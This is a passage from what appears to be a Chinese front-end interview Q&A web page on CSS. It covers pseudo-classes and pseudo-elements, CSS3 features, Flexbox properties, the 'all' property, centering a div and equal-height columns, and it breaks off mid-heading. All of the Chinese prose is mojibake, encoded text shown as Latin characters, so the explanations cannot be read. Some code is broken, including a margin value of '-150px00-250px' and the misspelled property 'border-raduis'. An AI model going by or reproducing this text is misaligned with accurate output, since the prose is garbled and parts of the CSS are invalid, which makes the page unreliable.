æ§åˆ¶è¡¨å•æ§ä»¶çš„ç¦ç”¨çŠ¶æ€ã€‚</p><p>ï¼ˆ14ï¼‰:checkedå•é€‰æ¡†æˆ–å¤é€‰æ¡†è¢«é€‰ä¸­ã€‚</p><h2 id="ä¼ªç±»ä¸ä¼ªå…ƒç´ çš„åŒºåˆ«"><a href="#ä¼ªç±»ä¸ä¼ªå…ƒç´ çš„åŒºåˆ«" class="headerlink" title="ä¼ªç±»ä¸ä¼ªå…ƒç´ çš„åŒºåˆ«"></a>ä¼ªç±»ä¸ä¼ªå…ƒç´ çš„åŒºåˆ«</h2><p>csså¼•å…¥ä¼ªç±»å’Œä¼ªå…ƒç´ æ¦‚å¿µæ˜¯ä¸ºäº†æ ¼å¼åŒ–æ–‡æ¡£æ ‘ä»¥å¤–çš„ä¿¡æ¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¼ªç±»å’Œä¼ªå…ƒç´ æ˜¯ç”¨æ¥ä¿®é¥°ä¸åœ¨æ–‡æ¡£æ ‘ä¸­çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚ï¼Œä¸€å¥è¯ä¸­çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œæˆ–è€…æ˜¯åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>ä¼ªç±»ä¸€èˆ¬åŒ¹é…çš„æ˜¯å…ƒç´ çš„ä¸€äº›ç‰¹æ®ŠçŠ¶æ€ï¼Œå¦‚hoverã€linkç­‰ï¼Œè€Œä¼ªå…ƒç´ ä¸€èˆ¬åŒ¹é…çš„ç‰¹æ®Šçš„ä½ç½®ï¼Œæ¯”å¦‚afterã€beforeç­‰ã€‚</p><p>ä¼ªç±»ç”¨äº<strong>å½“å·²æœ‰çš„å…ƒç´ å¤„äºæŸä¸ªçŠ¶æ€æ—¶ï¼Œä¸ºå…¶æ·»åŠ å¯¹åº”çš„æ ·å¼</strong>ï¼Œè¿™ä¸ªçŠ¶æ€æ˜¯æ ¹æ®ç”¨æˆ·è¡Œä¸ºè€ŒåŠ¨æ€å˜åŒ–çš„ã€‚æ¯”å¦‚è¯´ï¼Œå½“ç”¨æˆ·æ‚¬åœåœ¨æŒ‡å®šçš„å…ƒç´ æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡:hoveræ¥æè¿°è¿™ä¸ªå…ƒç´ çš„çŠ¶æ€ã€‚</p><p>ä¼ªå…ƒç´ ç”¨äº<strong>åˆ›å»ºä¸€äº›ä¸åœ¨æ–‡æ¡£æ ‘ä¸­çš„å…ƒç´ ï¼Œå¹¶ä¸ºå…¶æ·»åŠ æ ·å¼</strong>ã€‚å®ƒä»¬å…è®¸æˆ‘ä»¬ä¸ºå…ƒç´ çš„æŸäº›éƒ¨åˆ†è®¾ç½®æ ·å¼ã€‚æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡::beforeæ¥åœ¨ä¸€ä¸ªå…ƒç´ å‰å¢åŠ ä¸€äº›æ–‡æœ¬ï¼Œå¹¶ä¸ºè¿™äº›æ–‡æœ¬æ·»åŠ æ ·å¼ã€‚è™½ç„¶ç”¨æˆ·å¯ä»¥çœ‹åˆ°è¿™äº›æ–‡æœ¬ï¼Œä½†æ˜¯è¿™äº›æ–‡æœ¬å®é™…ä¸Šä¸åœ¨æ–‡æ¡£æ ‘ä¸­ã€‚</p><p>æœ‰æ—¶ä½ ä¼šå‘ç°ä¼ªå…ƒç´ ä½¿ç”¨äº†ä¸¤ä¸ªå†’å·ï¼ˆ::ï¼‰è€Œä¸æ˜¯ä¸€ä¸ªå†’å·ï¼ˆ:ï¼‰ã€‚è¿™æ˜¯CSS3çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶å°è¯•åŒºåˆ†ä¼ªç±»å’Œä¼ªå…ƒç´ ã€‚å¤§å¤šæ•°æµè§ˆå™¨éƒ½æ”¯æŒè¿™ä¸¤ä¸ªå€¼ã€‚æŒ‰ç…§è§„åˆ™åº”è¯¥ä½¿ç”¨ï¼ˆ::ï¼‰è€Œä¸æ˜¯ï¼ˆ:ï¼‰ï¼Œä»è€ŒåŒºåˆ†ä¼ªç±»å’Œä¼ªå…ƒç´ ã€‚ä½†æ˜¯ï¼Œç”±äºåœ¨æ—§ç‰ˆæœ¬çš„W3Cè§„èŒƒå¹¶æœªå¯¹æ­¤è¿›è¡Œç‰¹åˆ«åŒºåˆ†ï¼Œå› æ­¤ç›®å‰ç»å¤§å¤šæ•°çš„æµè§ˆå™¨éƒ½æ”¯æŒä½¿ç”¨è¿™ä¸¤ç§æ–¹å¼è¡¨ç¤ºä¼ªå…ƒç´ ã€‚</p><h2 id="CSS3æœ‰å“ªäº›æ–°ç‰¹æ€§ï¼Ÿï¼ˆæœ€å¥½æ ¹æ®é¡¹ç›®å›ç­”ï¼‰"><a href="#CSS3æœ‰å“ªäº›æ–°ç‰¹æ€§ï¼Ÿï¼ˆæœ€å¥½æ ¹æ®é¡¹ç›®å›ç­”ï¼‰" class="headerlink" title="CSS3æœ‰å“ªäº›æ–°ç‰¹æ€§ï¼Ÿï¼ˆæœ€å¥½æ ¹æ®é¡¹ç›®å›ç­”ï¼‰"></a>CSS3æœ‰å“ªäº›æ–°ç‰¹æ€§ï¼Ÿï¼ˆæœ€å¥½æ ¹æ®é¡¹ç›®å›ç­”ï¼‰</h2><p>å…³äº<code>CSS</code>æ–°å¢çš„ç‰¹æ€§ï¼Œæœ‰ä»¥ä¸‹ï¼š</p><ul><li>æ–°å¢å„ç§CSSé€‰æ‹©å™¨    ï¼ˆ:not(.input)ï¼šæ‰€æœ‰classä¸æ˜¯â€œinputâ€çš„èŠ‚ç‚¹ï¼‰</li><li>åœ†è§’<code>ï¼ˆborder-raduis:8pxï¼‰</code>;</li><li>å¤šåˆ—å¸ƒå±€<code>ï¼ˆmulti-column layoutï¼‰</code>;</li><li>é˜´å½±<code>ï¼ˆshadowï¼‰</code>å’Œåå°„<code>ï¼ˆreflectï¼‰</code>;</li><li>æ–‡å­—ç‰¹æ•ˆ<code>ï¼ˆtext-shadowï¼‰</code>;</li><li>æ–‡å­—æ¸²æŸ“<code>ï¼ˆtext-decoration</code>ï¼‰;</li><li>çº¿æ€§æ¸å˜<code>ï¼ˆgradientï¼‰</code>;</li><li>æ—‹è½¬<code>ï¼ˆrotate</code>ï¼‰/ç¼©æ”¾<code>ï¼ˆscaleï¼‰</code>/å€¾æ–œ<code>ï¼ˆskewï¼‰</code>/ç§»åŠ¨<code>ï¼ˆtranslateï¼‰</code>;</li><li>åª’ä½“æŸ¥è¯¢<code>ï¼ˆ@mediaï¼‰</code>;</li><li><code>RGBA</code>å’Œé€æ˜åº¦ ;</li><li><code>@font-face</code>å±æ€§;</li><li>å¤šèƒŒæ™¯å›¾ ;</li><li>ç›’å­å¤§å°;</li><li>è¯­éŸ³;</li></ul><h2 id="è¯·è§£é‡Šä¸€ä¸‹-CSS3-çš„-Flex-boxï¼ˆå¼¹æ€§ç›’å¸ƒå±€æ¨¡å‹ï¼‰ï¼Œä»¥åŠé€‚ç”¨åœºæ™¯ï¼Ÿ"><a href="#è¯·è§£é‡Šä¸€ä¸‹-CSS3-çš„-Flex-boxï¼ˆå¼¹æ€§ç›’å¸ƒå±€æ¨¡å‹ï¼‰ï¼Œä»¥åŠé€‚ç”¨åœºæ™¯ï¼Ÿ" class="headerlink" title="è¯·è§£é‡Šä¸€ä¸‹ CSS3 çš„ Flex boxï¼ˆå¼¹æ€§ç›’å¸ƒå±€æ¨¡å‹ï¼‰ï¼Œä»¥åŠé€‚ç”¨åœºæ™¯ï¼Ÿ"></a>è¯·è§£é‡Šä¸€ä¸‹ CSS3 çš„ Flex boxï¼ˆå¼¹æ€§ç›’å¸ƒå±€æ¨¡å‹ï¼‰ï¼Œä»¥åŠé€‚ç”¨åœºæ™¯ï¼Ÿ</h2><p>Flexæ˜¯FlexibleBoxçš„ç¼©å†™ï¼Œæ„ä¸ºâ€å¼¹æ€§å¸ƒå±€â€ï¼Œç”¨æ¥ä¸ºç›’çŠ¶æ¨¡å‹æä¾›æœ€å¤§çš„çµæ´»æ€§ã€‚</p><p>ä»»ä½•ä¸€ä¸ªå®¹å™¨éƒ½å¯ä»¥æŒ‡å®šä¸ºFlexå¸ƒå±€ã€‚è¡Œå†…å…ƒç´ ä¹Ÿå¯ä»¥ä½¿ç”¨Flexå¸ƒå±€ã€‚æ³¨æ„ï¼Œè®¾ä¸ºFlexå¸ƒå±€ä»¥åï¼Œå­å…ƒç´ çš„floatã€clearå’Œvertical-alignå±æ€§å°†å¤±æ•ˆã€‚</p><p>é‡‡ç”¨Flexå¸ƒå±€çš„å…ƒç´ ï¼Œç§°ä¸ºFlexå®¹å™¨ï¼ˆflex containerï¼‰ï¼Œç®€ç§°â€å®¹å™¨â€ã€‚å®ƒçš„æ‰€æœ‰å­å…ƒç´ è‡ªåŠ¨æˆä¸ºå®¹å™¨æˆå‘˜ï¼Œç§°ä¸ºFlexé¡¹ç›®ï¼ˆflex itemï¼‰ï¼Œç®€ç§°â€é¡¹ç›®â€ã€‚</p><p>å®¹å™¨é»˜è®¤å­˜åœ¨ä¸¤æ ¹è½´ï¼šæ°´å¹³çš„ä¸»è½´ï¼ˆmain axisï¼‰å’Œå‚ç›´çš„äº¤å‰è½´ï¼ˆcross axisï¼‰ï¼Œé¡¹ç›®é»˜è®¤æ²¿ä¸»è½´æ’åˆ—ã€‚</p><p>ä»¥ä¸‹6ä¸ªå±æ€§è®¾ç½®åœ¨å®¹å™¨ä¸Šã€‚</p><ul><li><p>flex-directionå±æ€§å†³å®šä¸»è½´çš„æ–¹å‘ï¼ˆå³é¡¹ç›®çš„æ’åˆ—æ–¹å‘ï¼‰ã€‚</p></li><li><p>flex-wrapå±æ€§å®šä¹‰ï¼Œå¦‚æœä¸€æ¡è½´çº¿æ’ä¸ä¸‹ï¼Œå¦‚ä½•æ¢è¡Œã€‚</p></li><li><p>flex-flowå±æ€§æ˜¯flex-directionå±æ€§å’Œflex-wrapå±æ€§çš„ç®€å†™å½¢å¼ï¼Œé»˜è®¤å€¼ä¸ºrow nowrapã€‚</p></li><li><p>justify-contentå±æ€§å®šä¹‰äº†é¡¹ç›®åœ¨ä¸»è½´ä¸Šçš„å¯¹é½æ–¹å¼ã€‚</p></li><li><p>align-itemså±æ€§å®šä¹‰é¡¹ç›®åœ¨äº¤å‰è½´ä¸Šå¦‚ä½•å¯¹é½ã€‚</p></li><li><p>align-contentå±æ€§å®šä¹‰äº†å¤šæ ¹è½´çº¿çš„å¯¹é½æ–¹å¼ã€‚å¦‚æœé¡¹ç›®åªæœ‰ä¸€æ ¹è½´çº¿ï¼Œè¯¥å±æ€§ä¸èµ·ä½œç”¨ã€‚</p></li></ul><p>ä»¥ä¸‹6ä¸ªå±æ€§è®¾ç½®åœ¨é¡¹ç›®ä¸Šã€‚</p><ul><li><p>orderå±æ€§å®šä¹‰é¡¹ç›®çš„æ’åˆ—é¡ºåºã€‚æ•°å€¼è¶Šå°ï¼Œæ’åˆ—è¶Šé å‰ï¼Œé»˜è®¤ä¸º0ã€‚</p></li><li><p>flex-growå±æ€§å®šä¹‰é¡¹ç›®çš„æ”¾å¤§æ¯”ä¾‹ï¼Œé»˜è®¤ä¸º0ï¼Œå³å¦‚æœå­˜åœ¨å‰©ä½™ç©ºé—´ï¼Œä¹Ÿä¸æ”¾å¤§ã€‚</p></li><li><p>flex-shrinkå±æ€§å®šä¹‰äº†é¡¹ç›®çš„ç¼©å°æ¯”ä¾‹ï¼Œé»˜è®¤ä¸º1ï¼Œå³å¦‚æœç©ºé—´ä¸è¶³ï¼Œè¯¥é¡¹ç›®å°†ç¼©å°ã€‚</p></li><li><p>flex-basiså±æ€§å®šä¹‰äº†åœ¨åˆ†é…å¤šä½™ç©ºé—´ä¹‹å‰ï¼Œé¡¹ç›®å æ®çš„ä¸»è½´ç©ºé—´ã€‚æµè§ˆå™¨æ ¹æ®è¿™ä¸ªå±æ€§ï¼Œè®¡ç®—ä¸»è½´æ˜¯å¦æœ‰å¤šä½™ç©ºé—´ã€‚å®ƒçš„é»˜è®¤å€¼ä¸ºautoï¼Œå³é¡¹ç›®çš„æœ¬æ¥å¤§å°ã€‚</p></li><li><p>flexå±æ€§æ˜¯flex-growï¼Œflex-shrinkå’Œflex-basisçš„ç®€å†™ï¼Œé»˜è®¤å€¼ä¸º0 1 autoã€‚</p></li><li><p>align-selfå±æ€§å…è®¸å•ä¸ªé¡¹ç›®æœ‰ä¸å…¶ä»–é¡¹ç›®ä¸ä¸€æ ·çš„å¯¹é½æ–¹å¼ï¼Œå¯è¦†ç›–align-itemså±æ€§ã€‚é»˜è®¤å€¼ä¸ºautoï¼Œè¡¨ç¤ºç»§æ‰¿çˆ¶<br>å…ƒç´ çš„align-itemså±æ€§ï¼Œå¦‚æœæ²¡æœ‰çˆ¶å…ƒç´ ï¼Œåˆ™ç­‰åŒäºstretchã€‚</p></li></ul><p><strong>å›ç­”ï¼š</strong></p><p>flexå¸ƒå±€æ˜¯CSS3æ–°å¢çš„ä¸€ç§å¸ƒå±€æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†ä¸€ä¸ªå…ƒç´ çš„displayå±æ€§å€¼è®¾ç½®ä¸ºflexä»è€Œä½¿å®ƒæˆä¸ºä¸€ä¸ªflex<br>å®¹å™¨ï¼Œå®ƒçš„æ‰€æœ‰å­å…ƒç´ éƒ½ä¼šæˆä¸ºå®ƒçš„é¡¹ç›®ã€‚</p><p>ä¸€ä¸ªå®¹å™¨é»˜è®¤æœ‰ä¸¤æ¡è½´ï¼Œä¸€ä¸ªæ˜¯æ°´å¹³çš„ä¸»è½´ï¼Œä¸€ä¸ªæ˜¯ä¸ä¸»è½´å‚ç›´çš„äº¤å‰è½´ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨flex-directionæ¥æŒ‡å®šä¸»è½´çš„æ–¹å‘ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨justify-contentæ¥æŒ‡å®šå…ƒç´ åœ¨ä¸»è½´ä¸Šçš„æ’åˆ—æ–¹å¼ï¼Œä½¿ç”¨align-itemsæ¥æŒ‡å®šå…ƒç´ åœ¨äº¤å‰è½´ä¸Šçš„æ’åˆ—æ–¹å¼ã€‚è¿˜<br>å¯ä»¥ä½¿ç”¨flex-wrapæ¥è§„å®šå½“ä¸€è¡Œæ’åˆ—ä¸ä¸‹æ—¶çš„æ¢è¡Œæ–¹å¼ã€‚</p><p>å¯¹äºå®¹å™¨ä¸­çš„é¡¹ç›®ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨orderå±æ€§æ¥æŒ‡å®šé¡¹ç›®çš„æ’åˆ—é¡ºåºï¼Œè¿˜å¯ä»¥ä½¿ç”¨flex-growæ¥æŒ‡å®šå½“æ’åˆ—ç©ºé—´æœ‰å‰©ä½™çš„æ—¶å€™ï¼Œé¡¹ç›®çš„æ”¾å¤§æ¯”ä¾‹ã€‚è¿˜å¯ä»¥ç”¨flex-shrinkæ¥æŒ‡å®šå½“æ’åˆ—ç©ºé—´ä¸è¶³æ—¶ï¼Œé¡¹ç›®çš„ç¼©å°æ¯”ä¾‹ã€‚</p><h2 id="ç®€å•è¯´ä¸€ä¸‹-css3-çš„-all-å±æ€§ã€‚"><a href="#ç®€å•è¯´ä¸€ä¸‹-css3-çš„-all-å±æ€§ã€‚" class="headerlink" title="ç®€å•è¯´ä¸€ä¸‹ css3 çš„ all å±æ€§ã€‚"></a>ç®€å•è¯´ä¸€ä¸‹ css3 çš„ all å±æ€§ã€‚</h2><p>allå±æ€§å®é™…ä¸Šæ˜¯æ‰€æœ‰CSSå±æ€§çš„ç¼©å†™ï¼Œè¡¨ç¤ºï¼Œæ‰€æœ‰çš„CSSå±æ€§éƒ½æ€æ ·æ€æ ·ï¼Œä½†æ˜¯ï¼Œä¸åŒ…æ‹¬unicode-bidiå’Œdirection<br>è¿™ä¸¤ä¸ªCSSå±æ€§ã€‚æ”¯æŒä¸‰ä¸ªCSSé€šç”¨å±æ€§å€¼ï¼Œinitial,inherit,unsetã€‚</p><ul><li><p>initialæ˜¯åˆå§‹å€¼çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯è¯¥å…ƒç´ å…ƒç´ éƒ½é™¤äº†unicode-bidiå’Œdirectionä»¥å¤–çš„CSSå±æ€§éƒ½ä½¿ç”¨å±æ€§çš„é»˜è®¤åˆå§‹å€¼ã€‚</p></li><li><p>inheritæ˜¯ç»§æ‰¿çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯è¯¥å…ƒç´ é™¤äº†unicode-bidiå’Œdirectionä»¥å¤–çš„CSSå±æ€§éƒ½ç»§æ‰¿çˆ¶å…ƒç´ çš„å±æ€§å€¼ã€‚</p></li><li><p>unsetæ˜¯å–æ¶ˆè®¾ç½®çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯å½“å‰å…ƒç´ æµè§ˆå™¨æˆ–ç”¨æˆ·è®¾ç½®çš„CSSå¿½ç•¥ï¼Œç„¶åå¦‚æœæ˜¯å…·æœ‰ç»§æ‰¿ç‰¹æ€§çš„CSSï¼Œå¦‚colorï¼Œåˆ™ä½¿ç”¨ç»§æ‰¿å€¼ï¼›å¦‚æœæ˜¯æ²¡æœ‰ç»§æ‰¿ç‰¹æ€§çš„CSSå±æ€§ï¼Œå¦‚background-colorï¼Œåˆ™ä½¿ç”¨åˆå§‹å€¼ã€‚</p></li></ul><h1 id="CSSå®ç°"><a href="#CSSå®ç°" class="headerlink" title="CSSå®ç°"></a>CSSå®ç°</h1><h2 id="å¦‚ä½•å±…ä¸­divï¼Ÿ"><a href="#å¦‚ä½•å±…ä¸­divï¼Ÿ" class="headerlink" title="å¦‚ä½•å±…ä¸­divï¼Ÿ"></a>å¦‚ä½•å±…ä¸­divï¼Ÿ</h2><h3 id="æ°´å¹³å±…ä¸­"><a href="#æ°´å¹³å±…ä¸­" class="headerlink" title="æ°´å¹³å±…ä¸­"></a>æ°´å¹³å±…ä¸­</h3><ul><li><p>æ–¹å¼1ï¼š ç»™ div è®¾ç½®ä¸€ä¸ªå®½åº¦ï¼Œç„¶åæ·»åŠ  margin:0 auto å±æ€§</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ–¹å¼2ï¼š ä½¿ç”¨ å®šä½ + left å±…ä¸­</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background</span>: pink;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ–¹å¼3ï¼šåˆ©ç”¨ text-align:center å®ç°</p></li></ul><h3 id="å‚ç›´å±…ä¸­"><a href="#å‚ç›´å±…ä¸­" class="headerlink" title="å‚ç›´å±…ä¸­"></a>å‚ç›´å±…ä¸­</h3><ul><li><p>ç¡®å®šå®¹å™¨çš„å®½é«˜  å®½500é«˜300  è®¾ç½®å±‚çš„å¤–è¾¹è·</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;<span class="comment">/*ç»å¯¹å®šä½*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">margin</span>: -<span class="number">150px</span>00-<span class="number">250px</span>;<span class="comment">/*å¤–è¾¹è·ä¸ºè‡ªèº«å®½é«˜çš„ä¸€åŠ*/</span></span><br><span class="line"><span class="attribute">background-color</span>: pink;<span class="comment">/*æ–¹ä¾¿çœ‹æ•ˆæœ*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æœªçŸ¥å®¹å™¨çš„å®½é«˜ï¼Œåˆ©ç”¨<code>transform</code>å±æ€§</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute; <span class="comment">/*ç›¸å¯¹å®šä½æˆ–ç»å¯¹å®šä½å‡å¯*/</span></span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">background-color</span>: pink; <span class="comment">/*æ–¹ä¾¿çœ‹æ•ˆæœ*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨flexå¸ƒå±€ <strong>å®é™…ä½¿ç”¨æ—¶åº”è€ƒè™‘å…¼å®¹æ€§</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center; <span class="comment">/*å‚ç›´å±…ä¸­*/</span></span><br><span class="line">  <span class="attribute">justify-content</span>: center; <span class="comment">/*æ°´å¹³å±…ä¸­*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.containerdiv</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: pink; <span class="comment">/*æ–¹ä¾¿çœ‹æ•ˆæœ*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨text-align:centerå’Œvertical-align:middleå±æ€§</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>);</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">  <span class="attribute">overflow</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">white-space</span>: normal;</span><br><span class="line">  <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>å›ç­”ï¼š</strong></p><p>ä¸€èˆ¬å¸¸è§çš„å‡ ç§å±…ä¸­çš„æ–¹æ³•æœ‰ï¼š</p><p>å¯¹äºå®½é«˜å›ºå®šçš„å…ƒç´ </p><p>ï¼ˆ1ï¼‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨margin:0 autoæ¥å®ç°å…ƒç´ çš„æ°´å¹³å±…ä¸­ã€‚</p><p>ï¼ˆ2ï¼‰åˆ©ç”¨ç»å¯¹å®šä½ï¼Œè®¾ç½®å››ä¸ªæ–¹å‘çš„å€¼éƒ½ä¸º0ï¼Œå¹¶å°†marginè®¾ç½®ä¸ºautoï¼Œç”±äºå®½é«˜å›ºå®šï¼Œå› æ­¤å¯¹åº”æ–¹å‘å®ç°å¹³åˆ†ï¼Œå¯ä»¥å®ç°æ°´å¹³å’Œå‚ç›´æ–¹å‘ä¸Šçš„å±…ä¸­ã€‚</p><p>ï¼ˆ3ï¼‰åˆ©ç”¨ç»å¯¹å®šä½ï¼Œå…ˆå°†å…ƒç´ çš„å·¦ä¸Šè§’é€šè¿‡top:50%å’Œleft:50%å®šä½åˆ°é¡µé¢çš„ä¸­å¿ƒï¼Œç„¶åå†é€šè¿‡marginè´Ÿå€¼æ¥è°ƒæ•´å…ƒç´ çš„ä¸­å¿ƒç‚¹åˆ°é¡µé¢çš„ä¸­å¿ƒã€‚</p><p>ï¼ˆ4ï¼‰åˆ©ç”¨ç»å¯¹å®šä½ï¼Œå…ˆå°†å…ƒç´ çš„å·¦ä¸Šè§’é€šè¿‡top:50%å’Œleft:50%å®šä½åˆ°é¡µé¢çš„ä¸­å¿ƒï¼Œç„¶åå†é€šè¿‡translateæ¥è°ƒæ•´å…ƒç´ çš„ä¸­å¿ƒç‚¹åˆ°é¡µé¢çš„ä¸­å¿ƒã€‚</p><p>ï¼ˆ5ï¼‰ä½¿ç”¨flexå¸ƒå±€ï¼Œé€šè¿‡align-items:centerå’Œjustify-content:centerè®¾ç½®å®¹å™¨çš„å‚ç›´å’Œæ°´å¹³æ–¹å‘ä¸Šä¸ºå±…ä¸­å¯¹<br>é½ï¼Œç„¶åå®ƒçš„å­å…ƒç´ ä¹Ÿå¯ä»¥å®ç°å‚ç›´å’Œæ°´å¹³çš„å±…ä¸­ã€‚</p><p>å¯¹äºå®½é«˜ä¸å®šçš„å…ƒç´ ï¼Œä¸Šé¢çš„åé¢ä¸¤ç§æ–¹æ³•ï¼Œå¯ä»¥å®ç°å…ƒç´ çš„å‚ç›´å’Œæ°´å¹³çš„å±…ä¸­ã€‚</p><h2 id="CSS-å¤šåˆ—ç­‰é«˜å¦‚ä½•å®ç°ï¼Ÿ"><a href="#CSS-å¤šåˆ—ç­‰é«˜å¦‚ä½•å®ç°ï¼Ÿ" class="headerlink" title="CSS å¤šåˆ—ç­‰é«˜å¦‚ä½•å®ç°ï¼Ÿ"></a>CSS å¤šåˆ—ç­‰é«˜å¦‚ä½•å®ç°ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰åˆ©ç”¨padding-bottom|margin-bottomæ­£è´Ÿå€¼ç›¸æŠµï¼Œä¸ä¼šå½±å“é¡µé¢å¸ƒå±€çš„ç‰¹ç‚¹ã€‚è®¾ç½®çˆ¶å®¹å™¨è®¾ç½®è¶…å‡ºéšè—ï¼ˆoverflow:hiddenï¼‰ï¼Œè¿™æ ·çˆ¶å®¹å™¨çš„é«˜åº¦å°±è¿˜æ˜¯å®ƒé‡Œé¢çš„åˆ—æ²¡æœ‰è®¾å®špadding-bottomæ—¶çš„é«˜åº¦ï¼Œå½“å®ƒé‡Œé¢çš„ä»»ä¸€åˆ—é«˜åº¦å¢åŠ äº†ï¼Œåˆ™çˆ¶å®¹å™¨çš„é«˜åº¦è¢«æ’‘åˆ°é‡Œé¢æœ€é«˜é‚£åˆ—çš„é«˜åº¦ï¼Œå…¶ä»–æ¯”è¿™åˆ—çŸ®çš„åˆ—ä¼šç”¨å®ƒä»¬çš„padding-bottomè¡¥å¿è¿™éƒ¨åˆ†é«˜åº¦å·®ã€‚</p><p>ï¼ˆ2ï¼‰åˆ©ç”¨table-cellæ‰€æœ‰å•å…ƒæ ¼é«˜åº¦éƒ½ç›¸ç­‰çš„ç‰¹æ€§ï¼Œæ¥å®ç°å¤šåˆ—ç­‰é«˜ã€‚</p><p>ï¼ˆ3ï¼‰åˆ©ç”¨flexå¸ƒå±€ä¸­é¡¹ç›®align-itemså±æ€§é»˜è®¤ä¸ºstretchï¼Œå¦‚æœé¡¹ç›®æœªè®¾ç½®é«˜åº¦æˆ–è®¾ä¸ºautoï¼Œå°†å æ»¡æ•´ä¸ªå®¹å™¨çš„é«˜åº¦<br>çš„ç‰¹æ€§ï¼Œæ¥å®ç°å¤šåˆ—ç­‰é«˜ã€‚</p><h2 id="ç”¨çº¯CSSåˆ›å»ºä¸€ä¸ªä¸‰è§’å½¢ï¼ŸåŸç†æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ç”¨çº¯CSSåˆ›å»ºä¸€ä¸ªä¸‰è§’å½¢ï¼ŸåŸç†æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" 